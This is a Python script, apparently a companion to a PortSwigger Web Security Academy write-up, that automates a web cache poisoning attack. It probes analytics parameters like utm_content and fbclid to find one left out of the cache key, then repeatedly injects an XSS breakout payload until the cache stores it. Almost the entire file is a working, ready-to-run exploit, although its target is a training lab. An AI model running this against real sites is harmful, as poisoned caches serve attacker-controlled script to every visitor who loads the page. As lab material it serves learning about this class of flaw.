#!/usr/bin/env python3
"""
Web cache poisoning via an unkeyed query parameter
PortSwigger Web Security Academy -- Web Cache Poisoning

Companion script for the writeup: 06-unkeyed-query-parameter.md

What this does:
    Fuzzes a candidate list of common analytics/tracking parameters
    (utm_content, fbclid, gclid, etc.) against a cache-busted URL, looking
    for one that reflects into the page AND survives being dropped on a
    follow-up request -- proof it's excluded from the cache key while the
    rest of the query string isn't. Once found, poisons that single
    parameter with an XSS breakout and loops until the cache picks it up.

Usage:
    python 06-unkeyed-query-parameter.py <lab-url>
    e.g. python 06-unkeyed-query-parameter.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import asyncio
import secrets
import sys
import httpx

UNKEYED_PARAM_CANDIDATES = [
    "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term",
    "fbclid", "gclid", "dclid", "msclkid", "mc_cid", "mc_eid",
    "_ga", "_gl", "ref", "source",
]


def _cache_buster() -> str:
    return secrets.token_hex(4)


def _is_cache_miss(headers: dict) -> bool:
    xc = headers.get("x-cache", "").lower()
    cf = headers.get("cf-cache-status", "").lower()
    return "miss" in xc or "miss" in cf


async def _lab_solved(client: httpx.AsyncClient, url: str) -> bool:
    r = await client.get(url)
    return "congratulations" in r.text.lower() or "is-solved" in r.text.lower()


async def solve(lab_url: str) -> None:
    xss = "'/><script>alert(1)</script>"

    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as client:
        # Step 1: find which param is unkeyed. Inject a canary, then drop
        # the param entirely on a follow-up request with the same cache
        # buster -- if the canary survives, the param never reached the key.
        excluded_param = None
        for param in UNKEYED_PARAM_CANDIDATES:
            cb = _cache_buster()
            canary = f"paramtest{secrets.token_hex(3)}"
            r1 = await client.get(f"{lab_url}/?cb={cb}&{param}={canary}")
            if canary not in r1.text:
                continue
            if not _is_cache_miss(dict(r1.headers)):
                continue
            await asyncio.sleep(0.3)
            r2 = await client.get(f"{lab_url}/?cb={cb}")
            if canary in r2.text:
                excluded_param = param
                print(f"[+] Parameter '{param}' is excluded from the cache key")
                break

        if not excluded_param:
            print("[-] No excluded parameter found -- cannot proceed")
            return

        # Step 2: poison the excluded parameter with the XSS breakout.
        print("[*] Starting poison + re-poison loop...")
        for cycle in range(40):
            r = await client.get(f"{lab_url}/?{excluded_param}={xss}")
            if _is_cache_miss(dict(r.headers)) and "alert(1)" in r.text:
                print(f"    Cycle {cycle + 1}: POISONED (miss)")

            if await _lab_solved(client, lab_url):
                print("[+] Lab solved.")
                return
            await asyncio.sleep(3)

    print("[-] Not solved after re-poison loop")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    asyncio.run(solve(sys.argv[1].rstrip("/")))
